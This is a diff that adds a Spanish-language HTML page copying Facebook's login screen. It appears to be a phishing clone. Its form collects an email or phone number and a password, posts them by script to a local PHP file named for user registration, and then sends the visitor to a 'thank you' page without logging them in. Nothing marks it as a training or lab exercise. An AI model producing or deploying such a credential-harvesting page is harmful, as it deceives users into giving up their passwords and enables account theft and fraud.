@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Inicia sesión o regístrate</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
+    <style>
+        body {
+            background-color: #F0F2F5;
+            font-family: 'Arial', sans-serif;
+        }
+        .container {
+            max-width: 1024px;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .logo {
+            color: #1877F2;
+            font-size: 50px;
+            font-weight: bold;
+        }
+        .subtitle {
+            font-size: 28px;
+            color: #1c1e21;
+            margin-top: 10px;
+            max-width: 500px;
+        }
+        .login-card {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+        }
+        .login-card input {
+            font-size: 16px;
+            padding: 14px;
+            margin-bottom: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .login-card button {
+            font-size: 20px;
+            background-color: #1877F2;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            width: 100%;
+            cursor: pointer;
+        }
+        .login-card a {
+            display: block;
+            margin: 10px 0;
+            color: #1877F2;
+            text-align: center;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .login-card .create-account {
+            background-color: #42b72a;
+            font-size: 17px;
+            margin-top: 10px;
+        }
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            color: #737373;
+        }
+        .footer a {
+            color: #737373;
+            text-decoration: none;
+            margin: 0 8px;
+            font-size: 12px;
+        }
+        .footer select {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #737373;
+            margin-bottom: 15px;
+        }
+        .footer div {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+        }
+    </style>
+    <script>
+        function handleFormSubmit(event) {
+            event.preventDefault();  // Prevenir el envío normal del formulario
+
+            // Enviar los datos del formulario usando fetch (opcional)
+            fetch(event.target.action, {
+                method: 'POST',
+                body: new FormData(event.target)
+            }).then(response => {
+                // Puedes manejar la respuesta si es necesario
+                return response.text();  // o response.json() si esperas JSON
+            }).then(data => {
+                console.log(data);  // Para ver la respuesta en la consola (opcional)
+                // Redirigir a la página de agradecimiento
+                window.location.href = 'gracias.html';
+            }).catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</head>
+<body>
+
+    <div class="container">
+        <div>
+            <div class="logo">facebook</div>
+            <div class="subtitle">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</div>
+        </div>
+        <div class="login-card">
+            <form action="php/registro_usuario_eb.php" method="POST" onsubmit="handleFormSubmit(event)">
+                <input type="text" name="correo" placeholder="Correo electrónico o número de teléfono" required>
+                <input type="password" name="contrasena" placeholder="Contraseña" required>
+                <button type="submit" id="submitBtn">Iniciar sesión</button>
+                <a href="#">¿Has olvidado la contraseña?</a>
+                <button type="button" class="create-account">Crear cuenta nueva</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="footer">
+        <select>
+            <option>Español (España)</option>
+            <option>English (US)</option>
+            <option>Français (France)</option>
+            <option>Português (Brasil)</option>
+            <option>Italiano</option>
+            <option>Deutsch</option>
+            <option>हिन्दी</option>
+            <option>中文(简体)</option>
+            <option>日本語</option>
+        </select>
+        <div>
+            <a href="#">Registrarte</a>
+            <a href="#">Iniciar sesión</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Watch</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Meta Pay</a>
+            <a href="#">Meta Store</a>
+            <a href="#">Meta Quest</a>
+            <a href="#">Instagram</a>
+            <a href="#">Threads</a>
+            <a href="#">Raising Funds</a>
+            <a href="#">Servicios</a>
+            <a href="#">Centro de información</a>
+            <a href="#">Política de privacidad</a>
+            <a href="#">Cookies</a>
+            <a href="#">Más opciones</a>
+        </div>
+    </div>
+
+</body>
+</html>
+
+
